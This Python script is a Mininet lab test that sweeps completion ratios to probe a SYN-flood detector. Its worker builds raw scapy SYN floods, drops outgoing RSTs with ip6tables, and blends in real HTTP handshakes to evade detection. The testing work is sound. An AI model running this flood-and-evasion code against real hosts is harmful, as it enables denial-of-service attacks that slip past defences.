"""
completion_test.py -- PARTIAL-COMPLETION attack test.

Question: how many of its handshakes must an attacker actually COMPLETE before
the detector stops blocking it? (i.e. the completion-ratio decision boundary,
and the realistic "blend real traffic into the flood to evade" threat model.)

Each host floods a mix: `pct`% of its attempts are REAL kernel HTTP connections
(full handshake + GET -> produce ACK evidence), the rest are raw scapy SYNs
(half-open, no ACK). Different hosts get different pct, so one run sweeps the
whole completion axis. Short + high rate (~200 attempts, a few seconds).

RUN ON SCENARIO 1 (all SYNs -> A, all ACKs -> B) so the completion ratio is
measured cleanly on one detector (no 3-way-split dilution). Server (nginx) up.

--- LAUNCHER (from the mininet> prompt) ---
    py exec(open('/home/ayush/my2/completion_test.py').read(), {'net': net, '__builtins__': __builtins__})
  Writes the IP->pct map to /tmp/completion_map.csv and launches one worker per
  host. Then analyse with:  python3 /home/ayush/my2/analyze_completion.py

--- WORKER (per host, launched automatically) ---
    python3 /home/ayush/my2/completion_test.py --worker --total 200 --pct 50
"""

import sys

VICTIM_IP  = "2001:1:1::100"
VICTIM_MAC = "aa:00:00:00:00:00"
DST_PORT   = 80

# completion percentages -> h1, h2, ...  (0 = pure flood, 100 = pure benign)
PCTS  = [0, 10, 20, 30, 50, 75, 100]
TOTAL = 200                     # attempts per host (short + high)
SELF  = '/home/ayush/my2/completion_test.py'
MAP   = '/tmp/completion_map.csv'


# ======================================================================
# WORKER  — runs inside one host's namespace
# ======================================================================
def worker():
    import re, time, socket, argparse, subprocess
    from scapy.all import Ether, IPv6, TCP, sendp
    import logging
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    ap = argparse.ArgumentParser()
    ap.add_argument('--worker', action='store_true')
    ap.add_argument('--total', type=int, default=200)
    ap.add_argument('--pct',   type=int, default=50)
    a = ap.parse_args()

    ipv6_map = {f'h{i}': f'2001:1:1::{i:x}' for i in range(1, 61)}

    subprocess.run(['sysctl', '-w', 'net.ipv6.conf.all.disable_ipv6=0'], capture_output=True)
    # drop kernel RSTs so the half-open SYNs stay half-open (the server's SYN-ACK
    # would otherwise be RST by our kernel). Real connections send FIN, not RST,
    # so this does not stop them completing.
    subprocess.run(['ip6tables', '-F', 'OUTPUT'], capture_output=True)
    subprocess.run(['ip6tables', '-A', 'OUTPUT', '-p', 'tcp',
                    '--tcp-flags', 'RST', 'RST', '-j', 'DROP'], capture_output=True)

    out = subprocess.run(['ip', 'link'], capture_output=True, text=True).stdout
    iface = None
    for line in out.split('\n'):
        m = re.search(r'\d+:\s+(h\d+-eth\d+)', line)   # only mininet host ifaces
        if m:
            iface = m.group(1); break
    if not iface:
        print("[completion] ERROR: no hN-eth interface — run inside a mininet host")
        sys.exit(1)
    mac = re.search(r'link/ether ([0-9a-f:]+)',
                    subprocess.run(['ip', 'link', 'show', iface],
                                   capture_output=True, text=True).stdout).group(1)
    r = subprocess.run(['ip', '-6', 'addr', 'show', iface], capture_output=True, text=True).stdout
    m6 = re.search(r'inet6 (2001[0-9a-f:]+)/\d+', r)
    if m6:
        src_ip = m6.group(1)
    else:
        src_ip = ipv6_map.get(iface.split('-eth')[0])
        if not src_ip:
            print(f"[completion] ERROR: {iface} not in host map"); sys.exit(1)
        subprocess.run(['ip', '-6', 'addr', 'add', 'nodad', src_ip + '/64', 'dev', iface],
                       capture_output=True)
    # static NDP for the victim so the kernel HTTP connections can route
    subprocess.run(['ip', '-6', 'neigh', 'replace', VICTIM_IP, 'lladdr', VICTIM_MAC,
                    'dev', iface, 'nud', 'permanent'], capture_output=True)

    total     = a.total
    completed = round(total * a.pct / 100.0)

    def send_halfopen(k):
        pkt = (Ether(src=mac, dst=VICTIM_MAC) /
               IPv6(src=src_ip, dst=VICTIM_IP) /
               TCP(sport=40000 + (k % 20000), dport=DST_PORT, flags="S", seq=1000 + k))
        sendp(pkt, iface=iface, verbose=0)

    def send_complete():
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((VICTIM_IP, DST_PORT, 0, 0))
            s.sendall(b"GET / HTTP/1.0\r\nHost: h0\r\n\r\n")
            s.recv(256)
            s.close()
            return True
        except Exception:
            return False

    # interleave the completed ones evenly across the flood (Bresenham-style)
    # so every 32-SYN window has ~pct% completions => a stable per-window ratio.
    print(f"[completion] {src_ip} pct={a.pct}% total={total} "
          f"(completed={completed}, halfopen={total-completed})")
    acc = 0.0
    frac = completed / total if total else 0.0
    done_c = 0
    t0 = time.time()
    for k in range(total):
        acc += frac
        if acc >= 1.0 and done_c < completed:
            acc -= 1.0
            send_complete(); done_c += 1
        else:
            send_halfopen(k)
    print(f"[completion] {src_ip} done in {time.time()-t0:.1f}s "
          f"(sent {total} SYNs, {done_c} completed)")


# ======================================================================
# LAUNCHER  — runs under `py exec(...)` with `net` in scope
# ======================================================================
if '--worker' in sys.argv:
    worker()
    sys.exit(0)

# ---- from here on we are the launcher (net is a global) ----
print('=' * 64)
print(f'[completion_test] partial-completion sweep  (TOTAL={TOTAL}/host)')
print('  RUN THE CONTROLLER ON SCENARIO 1 for a clean measurement.')
print('=' * 64)
print('  host   source IPv6        completion%')
print('  ----   ----------------   -----------')
rows = []
for i, pct in enumerate(PCTS, start=1):
    h   = f'h{i}'
    ip6 = f'2001:1:1::{i:x}'
    node = net.get(h)                                                  # noqa: F821
    node.cmd('sysctl -w net.ipv6.conf.all.disable_ipv6=0 >/dev/null 2>&1')
    node.cmd(f'ip -6 addr add nodad {ip6}/64 dev {h}-eth0 2>/dev/null')
    node.cmd(f'ip -6 neigh replace {VICTIM_IP} lladdr {VICTIM_MAC} dev {h}-eth0 nud permanent')
    node.cmd(f'python3 {SELF} --worker --total {TOTAL} --pct {pct} '
             f'>/tmp/comp_{h}.log 2>&1 &')
    rows.append((ip6, pct))
    print(f'  {h:<5}  {ip6:<16}   {pct}%')

with open(MAP, 'w') as f:
    f.write('src_ip,pct\n')
    for ip6, pct in rows:
        f.write(f'{ip6},{pct}\n')

print('=' * 64)
print(f'[completion_test] launched. Map written to {MAP}.')
print('[completion_test] when it settles: python3 /home/ayush/my2/analyze_completion.py')
print('=' * 64)
